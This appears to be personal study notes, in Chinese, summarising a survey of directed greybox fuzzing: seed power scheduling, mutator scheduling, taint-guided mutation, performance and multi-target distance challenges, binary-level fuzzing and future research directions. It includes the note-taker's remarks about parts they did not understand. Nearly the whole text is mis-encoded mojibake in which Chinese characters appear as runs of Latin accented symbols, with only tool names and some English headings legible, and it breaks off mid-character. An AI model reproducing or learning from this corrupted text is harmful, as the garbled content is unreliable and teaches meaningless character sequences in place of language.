AFLChurn[22]æå‡ºäº†ä¸€ç§åŸºäºèšç¾¤ä¼˜åŒ–çš„å­—èŠ‚çº§åŠŸç‡è°ƒåº¦ï¼Œå¯ä»¥å°†æ›´å¤šçš„èƒ½é‡åˆ†é…ç»™äº§ç”Ÿæ›´å¤šâ€œæœ‰è¶£â€è¾“å…¥çš„å­—èŠ‚ã€‚ LOLLY[83]å’ŒBerry[83]ä¼˜åŒ–äº†åŸºäºæ¨¡æ‹Ÿé€€ç«çš„åŠŸç‡è®¡åˆ’ï¼Œå¹¶è®¾ç½®äº†æ¸©åº¦é˜ˆå€¼ï¼Œä»¥åè°ƒå‹˜æ¢å’Œå¼€å‘é˜¶æ®µçš„å†·å´è®¡åˆ’ã€‚åœ¨æ¢ç´¢é˜¶æ®µï¼Œcooling scheduleå¯¹æä¾›çš„ç§å­è¿›è¡Œéšæœºçªå˜ï¼Œç”Ÿæˆè¾ƒå¤šçš„newinputï¼Œè€Œåœ¨å¼€å‘é˜¶æ®µï¼Œcooling schedule ä»åºåˆ—è¦†ç›–ç‡è¾ƒé«˜çš„ç§å­ä¸­ç”Ÿæˆè¾ƒå¤šçš„newinputï¼Œè¿™ä¸ä¼ ç»Ÿçš„æ¢¯åº¦ä¸‹é™ç®—æ³•ç›¸ä¼¼[83]ã€‚ é™¤äº†æ¨¡æ‹Ÿé€€ç«ï¼ŒGREYHOUND[12]è¿˜é‡‡ç”¨äº†è‡ªå®šä¹‰åˆ†ä»£ç²’å­ç¾¤ç®—æ³•ï¼Œæ›´é€‚åˆäºåè®®æ¨¡å‹çš„éçº¿æ€§å’Œéšæœºè¡Œä¸ºã€‚ mutator scheduling ä¼˜åŒ–çªå˜ç­–ç•¥æ˜¯æ”¹è¿›å®šå‘æ¨¡ç³Šçš„å¯è¡Œæ–¹æ³•ã€‚åˆç†è°ƒåº¦çªå˜å­å¯ä»¥æé«˜ç§å­çªå˜çš„ç²¾åº¦å’Œé€Ÿåº¦ï¼Œæé«˜è¾“å…¥çš„æ–¹å‘æ€§ã€‚ å¯è¡Œçš„æ–¹æ³•æ˜¯é¦–å…ˆå°†çªå˜å­åˆ’åˆ†ä¸ºç²—ç²’åº¦å’Œç»†ç²’åº¦[19,27,67,76]ï¼Œç„¶åæ ¹æ®å®é™…æ¨¡ç³ŠçŠ¶æ€åŠ¨æ€è°ƒæ•´ã€‚ç²—ç²’åº¦çªå˜å™¨ç”¨äºåœ¨çªå˜æœŸé—´æ”¹å˜å¤§é‡å­—èŠ‚ï¼Œä»¥å°†æ‰§è¡Œç§»å‘â€œæ˜“å—æ”»å‡»çš„å‡½æ•°â€ï¼Œè€Œç»†ç²’åº¦çªå˜å™¨åªæ¶‰åŠä¸€äº›å­—èŠ‚çº§çš„ä¿®æ”¹ã€æ’å…¥æˆ–åˆ é™¤ï¼Œä»¥ç›‘æ§â€œå…³é”®å˜é‡â€[19] åœ¨å®è·µä¸­ï¼Œçªå˜å­çš„è°ƒåº¦ç”±ç»éªŒå€¼æ§åˆ¶[27,67]ã€‚Situç­‰äºº[76]ç»™å‡ºäº†ä¸¤ä¸ªç»éªŒè§‚å¯Ÿç»“æœ:(1)ç²—ç²’çªå˜å­åœ¨è·¯å¾„ç”Ÿé•¿ä¸Šä¼˜äºç»†ç²’çªå˜å­;(2)ä¸å•ä¸ªçªå˜ç›¸æ¯”ï¼Œå¤šä¸ªçªå˜çš„ä½¿ç”¨æä¾›äº†æ›´å¥½çš„æ€§èƒ½ã€‚ mutation operations æ•°æ®æµåˆ†æï¼Œå¦‚æ±¡ç‚¹åˆ†æï¼Œå¯ä»¥åæ˜ çªå˜åœ¨ç”Ÿæˆçš„è¾“å…¥ä¸­çš„å½±å“ï¼Œå› æ­¤ï¼Œå®ƒæœ‰åŠ©äºä¼˜åŒ–çªå˜æ“ä½œå’Œè¾“å…¥ç”Ÿæˆã€‚ RDFuzz[69]åˆ©ç”¨æ‰°åŠ¨-æ£€æŸ¥æ–¹æ³•ä»è¾“å…¥ä¸­è¯†åˆ«å’Œä¿æŠ¤â€œè·ç¦»æ•æ„Ÿå†…å®¹â€ï¼Œå³å…³é”®å†…å®¹ï¼Œä»¥ä¿æŒè¾“å…¥ä¸ç›®æ ‡ä¹‹é—´çš„è·ç¦»ï¼Œä¸€æ—¦æ”¹å˜ï¼Œè·ç¦»å°±ä¼šå˜å¤§ã€‚åœ¨çªå˜æœŸé—´ä¿æŠ¤è¿™äº›å†…å®¹å¯ä»¥å¸®åŠ©æ›´æœ‰æ•ˆåœ°æ¥è¿‘ç›®æ ‡ä»£ç ä½ç½®ã€‚ UAFL[32]é‡‡ç”¨ä¿¡æ¯æµåˆ†ææ¥è¯†åˆ«æ¡ä»¶è¯­å¥ä¸­è¾“å…¥ä¸ç¨‹åºå˜é‡ä¹‹é—´çš„å…³ç³»ã€‚å®ƒå°†å¯¹ç›®æ ‡è¯­å¥å€¼æ”¹å˜å¯èƒ½æ€§è¶Šå¤§çš„è¾“å…¥å­—èŠ‚è§†ä¸ºâ€œä¿¡æ¯æµå¼ºåº¦â€è¶Šé«˜çš„è¾“å…¥å­—èŠ‚ï¼Œå¹¶èµ‹äºˆå…¶æ›´é«˜çš„çªå˜å¯èƒ½æ€§ã€‚ä¿¡æ¯æµå¼ºåº¦è¶Šé«˜ï¼Œè¯¥å­—èŠ‚å¯¹å˜é‡å€¼çš„å½±å“è¶Šå¼ºã€‚ SemFuzz[19]é€šè¿‡åå‘æ•°æ®æµåˆ†æè·Ÿè¸ªå…³é”®å˜é‡æ‰€ä¾èµ–çš„å†…æ ¸å‡½æ•°å‚æ•°ã€‚ TIFF[88]é€šè¿‡åŸºäºç±»å‹çš„çªå˜æ¥æ¨æ–­è¾“å…¥ç±»å‹ï¼Œä»¥å¢åŠ è§¦å‘å†…å­˜æŸåæ¼æ´çš„æ¦‚ç‡ã€‚å®ƒåˆ©ç”¨å†…å­˜ä¸­çš„æ•°æ®ç»“æ„è¯†åˆ«æ¥è¯†åˆ«åº”ç”¨ç¨‹åºä½¿ç”¨çš„æ¯ä¸ªå†…å­˜åœ°å€çš„ç±»å‹ï¼Œå¹¶ä½¿ç”¨åŠ¨æ€æ±¡æŸ“åˆ†ææ¥æ˜ å°„è¾“å…¥å­—èŠ‚æœ€ç»ˆåœ¨å“ªäº›å†…å­˜ä½ç½®ã€‚ç„¶è€Œï¼Œæ•°æ®æµåˆ†æé€šå¸¸ä¼šå¢åŠ è¿è¡Œæ—¶å¼€é”€ã€‚ ChallengesFaced by Directed Greybox Fuzzing Performance Deduction é¢å¤–çš„ä»ªå™¨å’Œæ•°æ®åˆ†æä½¿å¾—fuzzingçš„æ€§èƒ½ä¸‹é™ï¼Œä¼˜åŒ–æ•ˆç‡æ˜¯æé«˜æ–¹å‘æ€§çš„ä¸»è¦æŒ‘æˆ˜ã€‚ è§£å†³æ–¹æ¡ˆï¼š å°†ç¹é‡çš„ä¸æ‰§è¡Œæ— å…³çš„è®¡ç®—ä»è¿è¡Œæ—¶ç§»åˆ°ç¼–è¯‘æ—¶ã€‚ åœ¨æ‰§è¡Œå‰è¿‡æ»¤æ‰ç›®æ ‡æ— æ³•åˆ°è¾¾çš„è¾“å…¥ã€‚ ä½¿ç”¨æ›´è½»é‡çº§çš„ç®—æ³•ã€‚ åˆ©ç”¨å¹¶è¡Œè®¡ç®—ã€‚ Equal-weighted Metrics Bias Seed Prioritization ç­‰åŠ æƒæŒ‡æ ‡åå·®ç§å­ä¼˜å…ˆçº§ åœ¨å¤§å¤šæ•°æœ€å…ˆè¿›çš„å®šå‘ç°ç›’æ¨¡ç³Šå™¨ä¸­ï¼Œç§å­ä¼˜å…ˆçº§æ˜¯åŸºäºç­‰åŠ æƒæŒ‡æ ‡çš„ï¼Œå³ï¼Œå°†æ§åˆ¶æµå›¾ä¸­çš„æ¯ä¸ªåˆ†æ”¯è·³è§†ä¸ºå…·æœ‰ç­‰æ¦‚ç‡ã€‚ï¼Œè¿™æ ·çš„æµ‹é‡å¿½ç•¥äº†ä¸åŒçš„åˆ†æ”¯è·³è·ƒæœ‰ä¸åŒçš„æ¦‚ç‡ï¼Œå› æ­¤ï¼Œåå·®äº†å®šå‘æ¨¡ç³Šçš„æ€§èƒ½ã€‚ ä¸€ç§å¸¸è§çš„æƒ…å†µæ˜¯Aâ†’Cè¡¨ç¤ºé”™è¯¯å¤„ç†ä»£ç çš„æ‰§è¡Œè·¯å¾„ã€‚é”™è¯¯å¤„ç†ä»£ç é€šå¸¸ç®€çŸ­ï¼Œç”¨äºæ£€ç´¢èµ„æºï¼Œä¾‹å¦‚é‡Šæ”¾åˆ†é…çš„å†…å­˜ã€‚å› æ­¤ï¼Œä»é”™è¯¯å¤„ç†ä»£ç åˆ°ç›®æ ‡çš„æ‰§è¡Œè·¯å¾„é€šå¸¸è·ç¦»å¾ˆçŸ­(ä¾‹å¦‚ï¼Œä¸€è·³)ã€‚ç„¶è€Œï¼Œç”±äºå¾ˆå°‘æ‰§è¡Œé”™è¯¯å¤„ç†ä»£ç ï¼Œè¿™æ ·çš„æ‰§è¡Œè·¯å¾„çš„æ¦‚ç‡å¾ˆä½ã€‚å¦‚æœæˆ‘ä»¬åªè€ƒè™‘è·ç¦»ï¼Œé”™è¯¯å¤„ç†ä»£ç çš„è·¯å¾„å°±ä¼šè¢«è¿‡åˆ†å¼ºè°ƒï¼Œæˆ‘ä»¬å°±ä¼šå¿½ç•¥å®¹æ˜“å‡ºç°é”™è¯¯çš„å¸¸è§„ä»£ç ï¼Œä»è€Œå¯¼è‡´åå·®ã€‚ ä¸€ç§è§£å†³æ–¹æ¡ˆæ˜¯è€ƒè™‘åˆ†æ”¯è·³è½¬æ¦‚ç‡ï¼Œæ„å»ºåŠ æƒé€‚åº”åº¦æŒ‡æ ‡ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ¯ä¸ªseedçš„ä¼˜å…ˆçº§æ˜¯æ ¹æ®å°†å½“å‰æ‰§è¡Œè·¯å¾„è½¬æ¢ä¸ºç»è¿‡ç›®æ ‡çš„ç›®æ ‡è·¯å¾„çš„æ¦‚ç‡æ¥ç¡®å®šçš„ã€‚å› ä¸ºä¸€ä¸ªæ‰§è¡Œè·¯å¾„å¯ä»¥è¢«çœ‹ä½œæ˜¯ä¸€ä¸ªè¿ç»­åˆ†æ”¯[1]çš„é©¬å°”å¯å¤«é“¾ï¼Œè·¯å¾„æ¦‚ç‡å¯ä»¥é€šè¿‡æ”¶é›†è·¯å¾„å†…æ‰€æœ‰åˆ†æ”¯çš„æ¦‚ç‡æ¥è®¡ç®—ã€‚ç„¶ååŸºäºè’™ç‰¹å¡ç½—æ–¹æ³•[23]ï¼Œé€šè¿‡è®¡ç®—åˆ†æ”¯æ¦‚ç‡çš„æ¯”å€¼ï¼Œå¯ä»¥ç»Ÿè®¡åœ°ä¼°è®¡åˆ†æ”¯æ¦‚ç‡ã€‚ç”±äºæ¨¡ç³Šå¤„ç†çš„éšæœºæ€§å’Œé«˜é€šé‡ï¼Œæ»¡è¶³äº†è’™ç‰¹å¡ç½—æ–¹æ³•å¯¹éšæœºå¤§é‡‡æ ·çš„è¦æ±‚ã€‚å› æ­¤ï¼Œåˆ†å¸ƒå¯†åº¦å¯ä»¥ä»¥è½»é‡çº§çš„æ–¹å¼å½¢å¼åŒ–åœ°ä¼°è®¡åˆ†æ”¯è·³è½¬æ¦‚ç‡ã€‚ åŸºäºæ¦‚ç‡è¯„ä¼°ç›®æ ‡å¯è¾¾æ€§çš„ä¸€ä¸ªå¯èƒ½çš„ç¼ºç‚¹æ˜¯æ½œåœ¨çš„è¿è¡Œæ—¶å¼€é”€ã€‚ç»Ÿè®¡è·³å˜è®¡æ•°å’Œæ¦‚ç‡è®¡ç®—éƒ½å¼•å…¥äº†é¢å¤–çš„è®¡ç®—é‡ã€‚ç¼“è§£æ€§èƒ½ä¸‹é™çš„ä¸€ç§æ–¹æ³•æ˜¯é—´éš”æŠ½æ ·ã€‚é€šè¿‡é€‚å½“çš„é‡‡æ ·æ¥å‹ç¼©è·³è·ƒç»Ÿè®¡é‡ï¼Œå¯ä»¥åŠ å¿«æ¦‚ç‡è®¡ç®—çš„é€Ÿåº¦ï¼Œå‡è½»å­˜å‚¨ç©ºé—´çš„éœ€æ±‚ã€‚å¦ä¸€ç§æ–¹æ³•æ˜¯åŠ å¿«è·³è·ƒç»Ÿè®¡æ•°æ®çš„å­˜å‚¨å’Œè®¿é—®æ–¹å¼ã€‚ä¸€æ–¹é¢ï¼ŒåŸºäºæ¦‚ç‡çš„æ–¹æ³•ç»å¸¸æ›´æ–°è·³è·ƒç»Ÿè®¡æ•°æ®ï¼Œå¯è¾¾æ€§åˆ¤æ–­ä¹Ÿéœ€è¦å¿«é€Ÿè·Ÿè¸ªã€‚å¦ä¸€æ–¹é¢ï¼Œç”±äºè·³è·ƒé€šå¸¸åªæœ‰ä¸¤ä¸ªåˆ†æ”¯ï¼Œæ•°æ®åˆ†å¸ƒ(ä¾‹å¦‚åŸºäºçŸ©é˜µ)å°†æ˜¯ç›¸å¯¹ç¨€ç–çš„ï¼Œè¿™å°†æå¤§åœ°å¢åŠ ç©ºé—´æ¶ˆè€—ã€‚å› æ­¤ï¼Œéœ€è¦ä¸€ä¸ªè‡ªå®šä¹‰çš„æ•°æ®ç»“æ„æ¥å¹³è¡¡æ—¶é—´å’Œç©ºé—´çš„å¤æ‚æ€§ã€‚ Global Optimum Discrepancy in the Distance-based Metric åŸºäºè·ç¦»çš„åº¦é‡çš„å…¨å±€æœ€ä¼˜å·®å¼‚ å½“ä½¿ç”¨åŸºäºè·ç¦»çš„åº¦é‡åº¦é‡å¤šä¸ªç›®æ ‡æ—¶ï¼Œé‡‡å–çš„ç­–ç•¥æ˜¯å¯»æ±‚æ‰€æœ‰ç›®æ ‡çš„å…¨å±€æœ€çŸ­è·¯å¾„ï¼Œç„¶è€Œè¿™ç§å…¨å±€æœ€ä¼˜å¯èƒ½ä¼šé”™è¿‡æœ€æ¥è¿‘ç‰¹å®šç›®æ ‡çš„å±€éƒ¨æœ€ä¼˜ç§å­ï¼Œä»è€Œå¯¼è‡´å·®å¼‚ã€‚ ä¸¾ä¾‹çš„è¿™ä¸ªä¾‹å­æˆ‘æ²¡çœ‹æ‡‚ï¼Œæ—¢ç„¶Lä¸æ˜¯ç›®æ ‡ï¼Œé‚£ç¬¬ä¸‰ä¸ªç§å­åº”è¯¥æœ€å¼€å§‹å°±è¢«æ’é™¤ï¼Œæ€ä¹ˆè¿˜è®¡ç®—è·¯å¾„è·ç¦»å’Œåˆ«çš„ç§å­æ¯”è¾ƒå‘¢ï¼Ÿ é€ æˆè¿™ç§å·®å¼‚çš„åŸå› æ˜¯åŸºäºè·ç¦»çš„ç§å­æµ‹é‡åªå…³æ³¨æœ€çŸ­è·¯å¾„ã€‚å½“æœ‰å¤šæ¡è·¯å¾„åˆ°è¾¾åŒä¸€ç›®æ ‡æ—¶ï¼Œè¾ƒé•¿çš„è·¯å¾„å¯èƒ½è¢«å¿½ç•¥ï¼Œå¯¼è‡´ç»“æœä¸ä¸€è‡´ã€‚ åœ¨æ»¡è¶³ä»¥ä¸‹ä¸‰ä¸ªæ¡ä»¶æ—¶ï¼Œè¿™ç§å·®å¼‚æ˜¯ç°å®çš„ï¼Œå¹¶ä¸”ç»å¸¸å‘ç”Ÿ:(1)å¤šä¸ªç›®æ ‡æŒ‰è·ç¦»æµ‹é‡;(2)è‡³å°‘ä¸€ä¸ªç›®æ ‡å…·æœ‰å¤šæ¡å¯è¡Œè·¯å¾„;(3)ç§å­æ²¿ç€è¾ƒé•¿çš„è·¯å¾„è¿åŠ¨ï¼Œç”¨è¿™ä¸ªè·ç¦»æ¥è¡¡é‡ã€‚å¤šç›®æ ‡æµ‹è¯•æ˜¯åº”ç”¨DGFæ—¶ç»å¸¸ä½¿ç”¨çš„åœºæ™¯ã€‚ä¾‹å¦‚ï¼Œé€šè¿‡å°†ä»£ç æ›´æ”¹è®¾ç½®ä¸ºç›®æ ‡æ¥æµ‹è¯•è¡¥ä¸ã€‚å› æ­¤ï¼Œæ¡ä»¶1)å¾ˆå®¹æ˜“æ»¡è¶³ã€‚å¯¹äºæ¡ä»¶2)ï¼Œæˆ‘ä»¬ä¹Ÿä½¿ç”¨é”™è¯¯å¤„ç†ä»£ç ä½œä¸ºç¤ºä¾‹ã€‚é”™è¯¯å¤„ç†ä»£ç å¯ä»¥æ˜¯è®¸å¤šåŠŸèƒ½æ¨¡å—çš„ç›®æ ‡ï¼Œè¿™æ„å‘³ç€é”™è¯¯å¤„ç†ä»£ç ä¸­çš„ç›®æ ‡é€šå¸¸å¯ä»¥é€šè¿‡è®¸å¤šè·¯å¾„åˆ°è¾¾ï¼Œå› æ­¤æ¡ä»¶2)ä¹Ÿå¾ˆå®¹æ˜“æ»¡è¶³ã€‚æœ€åï¼Œæ¡ä»¶3)çš„æ»¡è¶³æ˜¯ä¸ç¡®å®šçš„ï¼Œå› ä¸ºæˆ‘ä»¬ä¸èƒ½ä¿è¯è¾ƒé•¿çš„è·¯å¾„è¢«è¡Œä½¿ã€‚åªæœ‰å½“ç§å­è¿åŠ¨çš„è·¯å¾„è¾ƒé•¿æ—¶ï¼Œæ‰ç”¨è¿™ä¸ªè·ç¦»æ¥è¡¡é‡ï¼Œå°±ä¼šå‡ºç°ä¸ä¸€è‡´ã€‚ï¼ˆæ²¡çœ‹æ‡‚ï¼‰ ä¸ºäº†é¿å…è¿™ç§å·®å¼‚ï¼Œå¿…é¡»è€ƒè™‘åˆ°åˆ°è¾¾ç›®æ ‡çš„æ‰€æœ‰å¯èƒ½è·¯å¾„ã€‚ä¾‹å¦‚ï¼Œåœ¨ä¸åŒçš„ä¸Šä¸‹æ–‡ä¸­ï¼Œä»è°ƒç”¨å‡½æ•°åˆ°ç«‹å³è°ƒç”¨å‡½æ•°çš„è·ç¦»å¯èƒ½ä¸å®Œå…¨ç›¸åŒã€‚ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼ŒHawkeyeä½¿ç”¨åŸºäºè½»é‡çº§é™æ€åˆ†æçš„â€œé‚»æ¥å‡½æ•°è·ç¦»å¢å¼ºâ€[67]ï¼Œè¯¥æ–¹æ³•åŸºäºç”Ÿæˆçš„è°ƒç”¨å›¾è€ƒè™‘(å³æ—¶)è°ƒç”¨å…³ç³»çš„æ¨¡å¼ï¼Œä»¥å¢å¼ºç”±å‘¼å«æ–¹å’Œè¢«å‘¼å«æ–¹ä¹‹é—´çš„å³æ—¶è°ƒç”¨å…³ç³»å®šä¹‰çš„è·ç¦»ã€‚åè°ƒå¤šç›®æ ‡çš„å¦ä¸€ä¸ªç­–ç•¥æ˜¯åˆ†ç¦»ç›®æ ‡ã€‚å¯¹äºæ¯ä¸ªç§å­ï¼Œåªæœ‰æ‰€æœ‰ç›®æ ‡çš„æœ€å°è·ç¦»è¢«é€‰æ‹©ä¸ºç§å­è·ç¦»ï¼Œå¹¶ä¸”ç§å­çš„ä¼˜å…ˆçº§åŸºäºè¿™ä¸ªæœ€å°è·ç¦»[20]ã€‚è¿™æ ·åšçš„ç»“æœæ˜¯å¦å®šäº†åå‘å…¨å±€æœ€ä¼˜è§£çš„å¯èƒ½æ€§ï¼Œä½†ä»£ä»·æ˜¯å¢åŠ äº†è¾¾åˆ°ç»™å®šç›®æ ‡æ‰€éœ€çš„æ—¶é—´ã€‚ Inflexible Coordination of Exploration Phase and Exploitation Phase å‹˜æ¢é˜¶æ®µå’Œå¼€å‘é˜¶æ®µçš„ä¸çµæ´»åè°ƒ DGFçš„å¦ä¸€ä¸ªæŒ‘æˆ˜åœ¨äºåè°ƒå‹˜æ¢ä¸å¼€å‘ä¹‹é—´çš„æƒè¡¡ã€‚ä¸€æ–¹é¢ï¼Œè¦åŠ å¤§å‹˜æ¢åŠ›åº¦ï¼Œä¸ºå¼€å‘æä¾›å……åˆ†çš„ä¿¡æ¯;å¦ä¸€æ–¹é¢ï¼Œè¿‡åº¦å‹˜æ¢ä¼šå ç”¨å¤§é‡èµ„æºï¼Œå»¶è¯¯å¼€å‘ã€‚ç¡®å®šå‹˜æ¢é˜¶æ®µä¸å¼€å‘é˜¶æ®µçš„ç•Œé™ä»¥è·å¾—æœ€ä½³å¼€é‡‡æ•ˆæœæ˜¯ä¸€é¡¹å›°éš¾çš„å·¥ä½œã€‚\nè¿™å—æ²¡ä»€ä¹ˆäººåšï¼Œåœ¨è°ƒæŸ¥çš„å®šå‘æ¨¡ç³Šå™¨ä¸­ï¼Œåªæœ‰ä¸€é¡¹å·¥ä½œæ˜¯ä¼˜åŒ–å‹˜æ¢å¼€å‘åè°ƒã€‚ RDFuzz[69]ç»“åˆè·ç¦»å’Œé¢‘ç‡æ¥è¯„ä¼°è¾“å…¥ã€‚åœ¨æ¢ç´¢é˜¶æ®µéœ€è¦ä½é¢‘è¾“å…¥ä»¥æé«˜è¦†ç›–èŒƒå›´ï¼Œè€Œåœ¨å¼€å‘é˜¶æ®µåˆ™å€¾å‘äºçŸ­è·ç¦»è¾“å…¥ä»¥å®ç°ç›®æ ‡ä»£ç åŒºåŸŸã€‚æœ€åé‡‡ç”¨ç›¸äº’ç¼ ç»•çš„è¯•éªŒè®¡åˆ’ï¼Œè¿›è¡Œå‹˜æ¢ä¸å¼€å‘äº¤æ›¿è¿›è¡Œã€‚ç„¶è€Œï¼Œå¯¹å››ç§è¾“å…¥ç±»å‹ (çŸ­/é•¿ã€ä½é¢‘/é«˜é¢‘) çš„åˆ†ç±»æ˜¯åˆæ­¥çš„ï¼Œå…¶æ€§èƒ½åœ¨å¾ˆå¤§ç¨‹åº¦ä¸Šå–å†³äºç»éªŒé˜ˆå€¼ã€‚ 2020usenix çš„ EcoFuzz è§£å†³äº†è¯¥é—®é¢˜ Dependence on the PUT Source Code å¤§å¤šæ•°å·²çŸ¥çš„DGFå·¥ä½œéœ€è¦æºä»£ç ï¼Œå®ƒä¸é€‚åˆæµ‹è¯•æºä»£ç ä¸å¯ç”¨çš„åœºæ™¯ï¼Œä¾‹å¦‚å•†ä¸šç°è´§(COTS)è½¯ä»¶ï¼Œæˆ–è€…éƒ¨åˆ†ä¾èµ–äºç¬¬ä¸‰æ–¹åº“çš„å®‰å…¨å…³é”®ç¨‹åºã€‚ åœ¨äºŒè¿›åˆ¶å±‚æ¬¡ä¸Šé˜»ç¢dgfåº”ç”¨çš„åŸå› æœ‰å¾ˆå¤šã€‚ é¦–å…ˆï¼Œæ²‰é‡çš„è¿è¡Œæ—¶å¼€é”€ã€‚äºŒè¿›åˆ¶çº§æµ‹è¯•çš„ç›´æ¥è§£å†³æ–¹æ¡ˆæ˜¯é€šè¿‡å…¨ç³»ç»Ÿæ¨¡æ‹Ÿå™¨ï¼Œä¾‹å¦‚QEMU[25]ã€‚ç„¶è€Œï¼ŒåŸºäºæ¨¡æ‹Ÿå™¨çš„å·¥å…·é€šå¸¸æ•ˆç‡è¾ƒä½ã€‚ å‡è½»æ€§èƒ½é™åˆ¶çš„å¯è¡Œè§£å†³æ–¹æ¡ˆæ˜¯ç¡¬ä»¶è¾…åŠ©ï¼Œä¾‹å¦‚è‹±ç‰¹å°”å¤„ç†å™¨è·Ÿè¸ª(PT)ã€‚Intel PTæ˜¯Intelå¤„ç†å™¨ä¸­çš„è½»é‡çº§ç¡¬ä»¶ç‰¹æ€§ã€‚å®ƒå¯ä»¥åŠ¨æ€åœ°è·Ÿè¸ªç¨‹åºæ‰§è¡Œï¼Œå¼€é”€å‡ ä¹å¯ä»¥å¿½ç•¥ä¸è®¡(å¹³å‡æ¯”QEMU-AFLå¿«4.3å€[94])ï¼Œä»è€Œå–ä»£äº†å¯¹åŠ¨æ€æ£€æµ‹çš„éœ€æ±‚ã€‚åˆ©ç”¨Intel PTæ•è·çš„æ•°æ®åŒ…è·Ÿè¸ªå’Œç›¸åº”çš„PUTäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå¯ä»¥å®Œå…¨é‡æ„PUTçš„æ‰§è¡Œè·¯å¾„ã€‚æœ‰äººå°è¯•ç”¨ptè¿›è¡Œæ¨¡ç³Š[7,93 - 95]ï¼Œä½†ä»æœªç”¨äºDGFã€‚ äºŒæ˜¯ç›®æ ‡ä¿¡æ¯æ”¶é›†å›°éš¾ã€‚å¼€æºPUTå¯ç”¨äºä»å„ç§æ¸ é“è·å–ç›®æ ‡ä¿¡æ¯ï¼Œä¾‹å¦‚cvevulvulnerabilityæè¿°[23,24]ï¼Œgitcommitæ—¥å¿—[19]ä¸­çš„æ›´æ”¹ï¼Œä»¥åŠæºä»£ç ä¸­å…³é”®ç«™ç‚¹ä¸Šçš„äººç±»ç»éªŒã€‚ç„¶è€Œï¼Œå¯¹äºäºŒè¿›åˆ¶ä»£ç ï¼Œæˆ‘ä»¬åªèƒ½ä»bugè·Ÿè¸ª[25]ä¸­æå–ç›®æ ‡ä¿¡æ¯ã€‚ ä¸‰æ˜¯ç›®æ ‡å®šä½å›°éš¾ã€‚å¯¹äºæºä»£ç æ£€æµ‹æ–¹æ³•ï¼Œç›®æ ‡å¯ä»¥åŸºäºæºä»£ç è¿›è¡Œæ ‡è®°(ä¾‹å¦‚ã€‚ï¼Œ cxxfilt.cï¼Œç¬¬100è¡Œ)ã€‚ç„¶è€Œï¼Œå¯¹äºäºŒè¿›åˆ¶æ¥è¯´è¦å›°éš¾å¾—å¤šã€‚ç”±äºäºŒè¿›åˆ¶ä»£ç å¾ˆéš¾è¯»å–ï¼Œå®ƒå¿…é¡»ä½¿ç”¨IDA Pro[25]ç­‰å·¥å…·è¿›è¡Œåˆ†è§£ï¼Œå¹¶ä½¿ç”¨è™šæ‹Ÿåœ°å€æ ‡è®°ç›®æ ‡ï¼Œè¿™æ—¢ä¸æ–¹ä¾¿åˆè€—æ—¶ã€‚ å¯¹äºäºŒè¿›åˆ¶ä»£ç çº§åˆ«çš„ç›®æ ‡è¯†åˆ«å’Œæ ‡è®°é—®é¢˜ï¼Œå¯ä»¥åˆ©ç”¨åŸºäºæœºå™¨å­¦ä¹ çš„æ–¹æ³•[27,28]å’Œå¯å‘å¼äºŒè¿›åˆ¶å·®åˆ†æ–¹æ³•[73]æ¥è‡ªåŠ¨è¯†åˆ«è„†å¼±ä»£ç  Application of DirectedGreyboxFuzzing patch testing bug reproduction knowledge integration result validation energy saving dgfçš„å¦ä¸€ä¸ªæœ‰è¶£çš„åº”ç”¨æ˜¯åœ¨æµ‹è¯•èµ„æºæœ‰é™çš„æƒ…å†µä¸‹ã€‚ä¾‹å¦‚ï¼Œå½“æ¨¡ç³Šç‰©è”ç½‘è®¾å¤‡ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œè¯†åˆ«å…³é”®ä»£ç åŒºåŸŸæ¥æŒ‡å¯¼æµ‹è¯•æ¯”ä»¥æ— å¯¼å‘çš„æ–¹å¼æµ‹è¯•æ•´ä¸ªç¨‹åºæ›´æœ‰æ•ˆï¼Œè¿™å¯ä»¥èŠ‚çœæ—¶é—´å’Œè®¡ç®—èµ„æºèŠ±åœ¨æ²¡æœ‰bugçš„ä»£ç åŒºåŸŸä¸Šã€‚GREYHOUND[12]å’ŒRVFUZZER[33]åˆ†åˆ«ä¸ºWi-Fiå®¢æˆ·ç«¯å’Œæœºå™¨äººè½¦è¾†è®¾è®¡ï¼Œå‡é€‚ç”¨äºæ­¤åœºæ™¯ã€‚ Special bug detection. Perspectives on Future Trends Exploitation of Relationship between Targets å½“ç›®æ ‡æ¨¡ç³ŠåŒ–ä»»åŠ¡ä¸­å­˜åœ¨å¤šä¸ªç›®æ ‡æ—¶ï¼Œå¦‚ä½•åè°ƒè¿™äº›ç›®æ ‡æ˜¯å¦ä¸€ä¸ªæŒ‘æˆ˜ã€‚å¯¹äºè¦è¾¾åˆ°çš„å¤šä¸ªç›®æ ‡ï¼ŒæŒ–æ˜ç›®æ ‡ä¹‹é—´çš„å…³ç³»å¯¹ä¼˜åŒ–dgfå…·æœ‰é‡è¦æ„ä¹‰ã€‚å¦‚æœç›®æ ‡æ˜¯ä¸ç›¸å…³çš„ï¼Œå¯ä»¥ç»™å®ƒä»¬åˆ†é…æƒé‡ï¼Œä»¥åŒºåˆ†é‡è¦æ€§æˆ–æ¦‚ç‡ã€‚æˆ–è€…ï¼Œå¯ä»¥æå–å’Œåˆ©ç”¨éšè—çš„å…³ç³»æ¥æé«˜æ–¹å‘æ€§ã€‚ åœ¨æ­¤ï¼Œæˆ‘ä»¬å»ºè®®åœ¨dgfç ”ç©¶ä¸­å¯ä»¥è€ƒè™‘ä»¥ä¸‹å…³ç³»ã€‚ ç©ºé—´å…³ç³»ã€‚å³ç›®æ ‡åœ¨æ‰§è¡Œæ ‘ä¸Šçš„ç›¸å¯¹ä½ç½®ã€‚è€ƒè™‘ä¸¤ä¸ªç›®æ ‡ä¹‹é—´çš„å…³ç³»ï¼ŒåŒ…æ‹¬å®ƒä»¬æ˜¯å¦å ç”¨åŒä¸€ä¸ªåˆ†æ”¯ã€å…±äº«æ‰§è¡Œçš„çº§åˆ«ä»¥åŠå®ƒä»¬çš„ç›¸å¯¹ä¼˜å…ˆçº§(å¦‚æœæœ‰çš„è¯)ã€‚ äº¤é”™çš„å…³ç³»ã€‚å¯¹äºå¤šçº¿ç¨‹ç¨‹åºï¼Œçº¿ç¨‹è°ƒåº¦ä¹Ÿä¼šå½±å“ä¸åŒçº¿ç¨‹ä¸­äº‹ä»¶çš„æ‰§è¡Œé¡ºåºã€‚åŒä¸€çº¿ç¨‹äº¤é”™ä¸‹å¯è¾¾åˆ°çš„ç›®æ 